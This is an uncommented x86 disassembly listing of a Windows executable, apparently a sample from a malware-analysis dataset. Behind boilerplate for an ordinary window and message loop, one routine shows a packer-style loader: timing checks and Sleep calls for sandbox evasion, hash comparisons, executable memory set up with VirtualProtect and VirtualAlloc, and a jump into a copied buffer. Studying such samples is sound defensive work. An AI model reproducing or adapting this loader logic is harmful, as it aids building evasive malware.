mov cl [ ecx + eax + 0x40 ]
mov [ esi + eax ] cl
inc eax
cmp eax [ ebx ]
jb r-xdata
mov ebx [ ebp - 0x50 ]
sub_401f54
push ebp
mov ebp esp
push esi
mov esi eax
push edi
push esi
push [ ebp + 0xc ]
call sub_4247f0
mov eax [ ebp + 0x8 ]
sub eax edi
push eax
lea eax [ esi + edi ]
push eax
push esi
call sub_424b60
push edi
push [ ebp + 0xc ]
sub esi edi
add esi [ ebp + 0x8 ]
push esi
call sub_4247f0
add esp 0x24
pop esi
pop ebp
retn
sub_401f89
push ebp
mov ebp esp
push esi
mov esi eax
mov eax ebx
sub eax edi
push edi
add eax esi
push eax
push [ ebp + 0x8 ]
call sub_4247f0
sub esi edi
push esi
lea eax [ ebx + edi ]
push ebx
push eax
call sub_424b60
push edi
push [ ebp + 0x8 ]
push ebx
call sub_4247f0
add esp 0x24
pop esi
pop ebp
retn
sub_401fbc
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_424ff8
mov [ ebp - 0xc ] eax
mov eax 0x10000
pop ecx
mov [ ebp - 0x8 ] esi
cmp esi eax
jb r-xdata
xor edi edi
inc edi
cmp [ ebp - 0x8 ] edi
jbe r-xdata
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
call sub_424fc7
pop ecx
pop edi
pop esi
leave
retn
push ebx
cmp [ ebp - 0x14 ] edi
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ebx
mov edi [ ebp - 0x18 ]
cmp edi [ ebp - 0x8 ]
jb r-xdata
push [ ebp - 0xc ]
mov eax ebx
push [ ebp - 0x14 ]
imul eax esi
add eax [ ebp + 0x8 ]
call sub_401f54
pop ecx
pop ecx
push [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
push esi
call sub_401f54
add [ ebp - 0x4 ] esi
dec [ ebp - 0x10 ]
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x18 ] esi
imul esi edi
xor edx edx
div esi
mov ebx eax
mov [ ebp - 0x14 ] edx
test ebx ebx
je r-xdata
pop ebx
sub_402051
push ebp
mov ebp esp
sub esp 0x14
push [ ebp + 0xc ]
call sub_424ff8
mov [ ebp - 0x8 ] eax
mov eax 0x10000
pop ecx
cmp [ ebp + 0xc ] eax
jae r-xdata
push edi
lea edi [ eax - 0x1 ]
cmp edi 0x1
jb r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x8 ]
call sub_424fc7
pop ecx
pop edi
leave
retn
lea eax [ edi + 0x1 ]
push ebx
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp - 0x10 ]
cmp eax edi
jbe r-xdata
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
dec edi
dec [ ebp - 0x4 ]
cmp edi 0x1
jae r-xdata
mov ebx [ ebp - 0x14 ]
push [ ebp - 0x8 ]
imul ebx esi
add ebx [ ebp + 0x8 ]
call sub_401f89
pop ecx
push [ ebp - 0x8 ]
mov eax esi
call sub_401f89
add ebx esi
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
imul esi edi
xor edx edx
div esi
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop esi
pop ebx
sub_4020e0
push ebp
mov ebp esp
lea eax [ esi + 0x4 ]
push edi
push eax
mov [ ecx ] eax
call sub_424ff8
mov edi eax
pop ecx
xor eax eax
xor ecx ecx
mov edx esi
shr edx cl
add ecx 0x8
mov [ eax + edi ] dl
inc eax
cmp ecx 0x20
jne r-xdata
test esi esi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
push [ ebp + 0x8 ]
lea ebx [ edi + 0x4 ]
push ebx
call sub_4247f0
push 0x4
push edi
call sub_401fbc
push esi
push ebx
call sub_401fbc
add esp 0x1c
pop ebx
sub_402130
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx eax
push 0x4
lea eax [ ebp - 0x4 ]
push ebx
push eax
call sub_4247f0
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_402051
xor ecx ecx
add esp 0x14
mov [ esi ] ecx
xor eax eax
mov edi ecx
movzx edx [ ebp + eax - 0x4 ]
shl edx cl
add ecx 0x8
or edi edx
inc eax
cmp ecx 0x20
jne r-xdata
push edi
mov [ esi ] edi
call sub_424ff8
mov edi eax
mov eax [ esi ]
pop ecx
test eax eax
je r-xdata
mov eax edi
pop edi
pop ebx
leave
retn
push eax
add ebx 0x4
push ebx
push edi
call sub_4247f0
push [ esi ]
push edi
call sub_402051
add esp 0x14
sub_40219f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
mov edi [ rw-data ]
call esi
mov [ ebp - 0x8 ] eax
call esi
xor ebx ebx
jmp r-xdata
mov ecx eax
sub ecx [ ebp - 0x8 ]
cmp ecx 0x64
jb r-xdata
inc ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1505
test edi edi
je r-xdata
mov ecx ebx
shl ecx 0x3
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
fild [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
jns r-xdata
mov [ ebp - 0xc ] 0x45872367
mov [ ebp - 0x10 ] 0x1984
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
imul edx edx 0x21
movzx ecx [ eax + ecx ]
add ecx edx
inc eax
mov [ ebp - 0x4 ] ecx
cmp eax edi
jb r-xdata
fdiv [ r--data ]
fdivp st1
call sub_449cc0
inc eax
test eax eax
jle r-xdata
fadd [ r--data ]
movzx edx [ ebp + eax - 0xc ]
imul ecx ecx 0x21
add ecx edx
inc eax
cmp eax 0x4
jb r-xdata
dec [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x8 ] eax
mov ecx 0x1505
xor eax eax
cmp ecx 0x7ccf27b6
jne r-xdata
mov [ ebp - 0x10 ] 0x45872367
mov [ ebp - 0xc ] 0x1984
mov ecx [ ebp + 0x8 ]
imul ebx ebx 0x21
movzx ecx [ eax + ecx ]
add ebx ecx
inc eax
cmp eax edi
jb r-xdata
call esi
xor eax eax
test edi edi
je r-xdata
movzx esi [ ebp + eax - 0x10 ]
imul ecx ecx 0x21
add ecx esi
inc eax
cmp eax 0x4
jb r-xdata
dec [ ebp - 0xc ]
mov [ ebp - 0x10 ] ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx ]
mov cl [ ebp - 0x4 ]
shr [ edx ] cl
inc eax
cmp eax edi
jb r-xdata
mov ecx edx
xor eax eax
cmp ecx 0x7ccf27b6
jne r-xdata
push 0x3
call [ Sleep@IAT ]
dec [ ebp - 0x8 ]
jne r-xdata
xor eax eax
test edi edi
je r-xdata
mov edx 0x1505
xor eax eax
mov ebx edx
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx ]
mov cl bl
shr [ edx ] cl
inc eax
cmp eax edi
jb r-xdata
sub_4022e6
push ebp
mov ebp esp
sub esp 0xd8
push esi
push edi
mov [ ebp - 0x4 ] rw-data
mov eax [ rw-data ]
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0x50 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x40 ] eax
call GetTickCount
mov [ ebp - 0x44 ] eax
call GetTickCount
mov [ ebp - 0x48 ] eax
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x58 ] 0x8
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0xd0 ] eax
and [ ebp - 0xcc ] 0x0
fild [ ebp - 0xd0 ]
fmul [ r--data ]
fdiv [ r--data ]
fstp [ ebp - 0x64 ]
mov eax [ ebp - 0x54 ]
shl eax 0x3
mov [ ebp - 0xd4 ] eax
fild [ ebp - 0xd4 ]
fdiv [ ebp - 0x64 ]
call sub_449cc0
inc eax
mov [ ebp - 0x4c ] eax
and [ ebp - 0x6c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x54 ]
inc eax
mov [ ebp - 0x54 ] eax
and [ ebp - 0x68 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x6c ]
cmp eax [ ebp - 0x4c ]
jge r-xdata
cmp [ ebp - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0xc4 ] 0x0
and [ ebp - 0x70 ] 0x0
jmp r-xdata
call GetTickCount
mov [ ebp - 0x48 ] eax
jmp r-xdata
mov [ ebp - 0x84 ] 0x1505
and [ ebp - 0x88 ] 0x0
jmp r-xdata
mov [ ebp - 0xc5 ] 0x1
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc4 ]
movzx eax [ eax ]
test eax eax
jne r-xdata
cmp [ ebp - 0x70 ] 0x1
jge r-xdata
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x44 ]
cmp eax 0x64
jae r-xdata
mov eax [ ebp - 0x88 ]
cmp eax [ ebp - 0xb4 ]
jae r-xdata
and [ ebp - 0xbc ] 0x0
push [ rw-data ]
call sub_424f00
pop ecx
mov [ ebp - 0xb8 ] eax
and [ ebp - 0xc0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc4 ]
movzx eax [ eax ]
cdq
push 0x5
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc4 ]
movzx eax [ eax + 0x1 ]
cdq
push 0x5
pop ecx
idiv ecx
test edx edx
jne r-xdata
push 0x3
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0xa4 ] 0x1505
and [ ebp - 0xa8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] 0x45872367
and [ ebp - 0x7c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x84 ]
shl eax 0x5
add eax [ ebp - 0x84 ]
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x88 ]
movzx ecx [ ecx ]
add eax ecx
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov eax [ ebp - 0xc0 ]
cmp eax [ rw-data ]
jae r-xdata
lea esi [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_402130
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x3c ] 0x4
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x4 ]
call sub_423ec0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax + 0x4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x24 ] eax
mov eax [ GetProcAddress@IAT ]
cdq
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
lea eax [ ebp - 0xc ]
push eax
push 0x40
mov eax [ ebp - 0x24 ]
push [ eax + 0x10 ]
mov eax [ ebp - 0x24 ]
push [ eax + 0x14 ]
call [ VirtualProtect@IAT ]
push 0x40
push 0x1000
push [ ebp - 0x10 ]
push 0x0
call [ VirtualAlloc@IAT ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0xd8 ]
mov ecx [ ebp - 0xd8 ]
mov eax [ eax + 0x14 ]
or eax [ ecx + 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc4 ]
inc eax
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc5 ] 0x0
jmp r-xdata
mov [ ebp - 0xc5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc4 ]
inc eax
inc eax
mov [ ebp - 0xc4 ] eax
jmp r-xdata
mov eax [ ebp - 0x6c ]
inc eax
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0xa8 ]
cmp eax [ ebp - 0xb4 ]
jae r-xdata
cmp [ ebp - 0x7c ] 0x1984
jge r-xdata
mov eax [ ebp - 0x88 ]
inc eax
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0xbc ]
mov [ rw-data ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0xc0 ]
movzx eax [ eax ]
test eax eax
jne r-xdata
mov eax [ LoadLibraryA@IAT ]
cdq
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
push 0x0
call [ GetModuleHandleW@IAT ]
cdq
mov ecx [ ebp - 0x24 ]
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] edx
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push [ ebp - 0x34 ]
call sub_4247f0
add esp 0xc
call sub_403a58
jmp r-xdata
mov eax [ rw-data ]
dec eax
cmp [ ebp - 0xc4 ] eax
jae r-xdata
movzx eax [ ebp - 0xc5 ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] 0x45872367
and [ ebp - 0x9c ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
shl eax 0x5
add eax [ ebp - 0xa4 ]
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0xa8 ]
movzx ecx [ ecx ]
add eax ecx
mov [ ebp - 0xa4 ] eax
jmp r-xdata
cmp [ ebp - 0x74 ] 0x7ccf27b6
je r-xdata
mov [ ebp - 0x8c ] 0x1505
and [ ebp - 0x90 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xb8 ]
add eax [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc0 ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0xbc ]
inc eax
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0xc0 ]
inc eax
mov [ ebp - 0xc0 ] eax
mov eax [ ebp - 0xb8 ]
add eax [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc0 ]
mov cl [ ecx ]
mov [ eax ] cl
mov eax [ ebp - 0xbc ]
inc eax
mov [ ebp - 0xbc ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] 0xf000d00d
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x24 ]
mov [ eax + 0x4 ] 0xae0ebbbb
mov eax [ ebp - 0x34 ]
add eax 0xf
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
mov [ eax ] ecx
mov eax [ ebp - 0x24 ]
or [ eax + 0x18 ] 0xffffffff
mov esi [ rw-data ]
mov esp [ rw-data ]
mov edx [ rw-data ]
mov edi [ rw-data ]
mov ecx [ rw-data ]
mov eax [ ebp - 0x30 ]
mov ebp [ rw-data ]
jmp eax
jmp r-xdata
cmp [ ebp - 0x9c ] 0x1984
jge r-xdata
mov eax [ ebp - 0xa8 ]
inc eax
mov [ ebp - 0xa8 ] eax
and [ ebp - 0x80 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0x90 ] 0x4
jae r-xdata
mov eax [ ebp - 0xc0 ]
inc eax
mov [ ebp - 0xc0 ] eax
jmp r-xdata
cmp [ ebp - 0x94 ] 0x7ccf27b6
je r-xdata
mov [ ebp - 0xac ] 0x1505
and [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x80 ]
cmp eax [ ebp - 0xb4 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x74 ] eax
jmp r-xdata
mov eax [ ebp - 0x8c ]
shl eax 0x5
add eax [ ebp - 0x8c ]
mov ecx [ ebp - 0x90 ]
movzx ecx [ ebp + ecx - 0x74 ]
add eax ecx
mov [ ebp - 0x8c ] eax
jmp r-xdata
and [ ebp - 0xa0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
cmp [ ebp - 0xb0 ] 0x4
jae r-xdata
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
add eax [ ebp - 0x80 ]
mov al [ eax ]
mov cl [ ebp - 0x78 ]
shr al cl
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x80 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp - 0x68 ]
inc eax
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x7c ]
inc eax
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x90 ]
inc eax
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0xa0 ]
cmp eax [ ebp - 0xb4 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0xac ]
mov [ ebp - 0x94 ] eax
jmp r-xdata
mov eax [ ebp - 0xac ]
shl eax 0x5
add eax [ ebp - 0xac ]
mov ecx [ ebp - 0xb0 ]
movzx ecx [ ebp + ecx - 0x94 ]
add eax ecx
mov [ ebp - 0xac ] eax
jmp r-xdata
mov eax [ ebp - 0x80 ]
inc eax
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
add eax [ ebp - 0xa0 ]
mov al [ eax ]
mov cl [ ebp - 0x98 ]
shr al cl
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0xa0 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp - 0x70 ]
inc eax
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x9c ]
inc eax
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0xb0 ]
inc eax
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0xa0 ]
inc eax
mov [ ebp - 0xa0 ] eax
sub_402912
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
lea eax [ rw-data ]
mov [ eax ] ebp
lea edi [ rw-data ]
mov [ eax ] edi
lea esi [ rw-data ]
mov [ eax ] esi
lea eax [ rw-data ]
mov [ eax ] edx
lea eax [ rw-data ]
mov [ eax ] ecx
push eax
lea eax [ rw-data ]
mov [ eax ] esp
add [ eax ] 0x4
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_4029d9
call sub_4022e6
mov esi [ LoadStringA@IAT ]
push 0x64
push rw-data
push 0x67
push edi
call esi
push 0x64
push rw-data
push 0x6d
push edi
call esi
push [ ebp + 0x14 ]
mov eax edi
call sub_402a4a
pop ecx
push 0x6d
push edi
call [ LoadAcceleratorsA@IAT ]
mov esi [ GetMessageA@IAT ]
mov ebx eax
xor edi edi
jmp r-xdata
push edi
push edi
push edi
lea eax [ ebp - 0x1c ]
push eax
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp - 0x1c ]
call [ TranslateAcceleratorA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
sub_4029d9
push ebp
mov ebp esp
sub esp 0x30
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x20 ] 0x0
push esi
mov esi [ LoadIconA@IAT ]
push 0x6b
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_402a9b
mov [ ebp - 0x1c ] eax
call esi
push 0x7f00
push 0x0
mov [ ebp - 0x18 ] eax
call [ LoadCursorA@IAT ]
push 0x6c
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rw-data
call esi
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExA@IAT ]
pop esi
leave
retn
sub_402a4a
push ebp
mov ebp esp
push esi
push edi
xor esi esi
push esi
push eax
push esi
push esi
push esi
mov [ rw-data ] eax
mov eax 0x80000000
push eax
push esi
push eax
push 0xcf0000
push rw-data
push rw-data
push esi
call [ CreateWindowExA@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push [ ebp + 0x8 ]
push edi
call [ ShowWindow@IAT ]
push edi
call [ UpdateWindow@IAT ]
xor eax eax
inc eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_402a9b
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
dec eax
dec eax
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
sub eax 0xd
je r-xdata
lea eax [ ebp - 0x44 ]
push eax
push esi
call [ BeginPaint@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push esi
call [ EndPaint@IAT ]
jmp r-xdata
sub eax 0x102
je r-xdata
xor eax eax
movzx eax [ ebp + 0x10 ]
sub eax 0x68
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
push 0x0
push sub_402b3f
push esi
push 0x67
push [ rw-data ]
call [ DialogBoxParamA@IAT ]
jmp r-xdata
dec eax
je r-xdata
push esi
call [ DefWindowProcA@IAT ]
jmp r-xdata
push esi
call [ DestroyWindow@IAT ]
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x111
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4247dc
leave
retn 0x10
sub_402b3f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
xor eax eax
inc eax
dec eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
pop ebp
retn 0x10
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ EndDialog@IAT ]
cmp [ ebp + 0x10 ] 0x2
je r-xdata
sub_402b9d
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_402c65
push ebp
mov ebp esp
push [ ebp + 0xc ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4255d8
fstp [ ebp + 0x8 ]
add esp 0xc
fld [ ebp + 0x8 ]
pop ebp
retn
sub_402cfd
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_402d21
push 0xc
mov eax sub_449fbf
call sub_448595
mov esi [ ebp + 0x8 ]
xor ebx ebx
push ebx
mov ecx esi
call sub_44726a
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
cmp [ ebp + 0xc ] ebx
jne r-xdata
push [ ebp + 0xc ]
push esi
call sub_446fce
pop ecx
pop ecx
mov eax esi
call sub_44866d
retn 0x8
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0xc ] r--data
call sub_4252f8
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] r--data
call sub_426f77
sub_402d9b
push 0x0
mov eax sub_449e9f
call sub_448595
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x4
call sub_446f5b
mov eax [ esi + 0x1c ]
pop ecx
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
and [ esi + 0x14 ] 0x0
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
and [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_42578a
pop ecx
and [ esi + 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_447292
call sub_44866d
retn 0x4
push eax
call sub_42578a
pop ecx
sub_402e13
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_4474d9
mov edi [ ebp + 0x8 ]
mov esi eax
mov eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_402e7e
push ebp
mov ebp esp
push ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_44726a
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_447292
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_402eaf
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_44726a
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_447292
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_402ed7
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_44726a
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_447292
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_402f78
mov ecx [ esi ]
cmp ecx [ edi ]
je r-xdata
mov eax esi
retn
call sub_402ed7
test eax eax
je r-xdata
mov ecx [ edi ]
mov [ esi ] ecx
call sub_402eaf
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_402f9b
push ebp
mov ebp esp
push ecx
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
call sub_403a6f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
lea ecx [ eax + 0x1c ]
sub_402fcf
mov ecx [ eax ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
retn
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_446e1d
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
retn
sub_402ffd
push 0x60
mov eax sub_44d9e2
call sub_4485fe
and [ ebp - 0x6c ] 0x0
mov eax [ esi ]
xor ebx ebx
mov edi ecx
inc ebx
cmp eax [ edi ]
je r-xdata
mov [ ebp - 0x65 ] bl
lea eax [ ebp - 0x48 ]
push eax
mov eax esi
call sub_402f9b
mov edx eax
and [ ebp - 0x4 ] 0x0
mov eax [ edx + 0x10 ]
push ebx
push r--data
mov [ ebp - 0x6c ] ebx
call sub_404814
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
test [ ebp - 0x6c ] 0x2
je r-xdata
and [ ebp - 0x6c ] 0xfffffffb
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_40487c
mov [ ebp - 0x65 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax edi
call sub_402f9b
mov edi eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
mov eax esi
mov [ ebp - 0x6c ] 0x3
call sub_402f9b
mov edx eax
mov [ ebp - 0x4 ] 0x2
mov eax edi
mov [ ebp - 0x6c ] 0x7
call sub_403b02
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x6c ] bl
je r-xdata
and [ ebp - 0x6c ] 0xfffffffd
push 0x0
push ebx
lea ecx [ ebp - 0x64 ]
call sub_40487c
mov [ ebp - 0x4 ] ebx
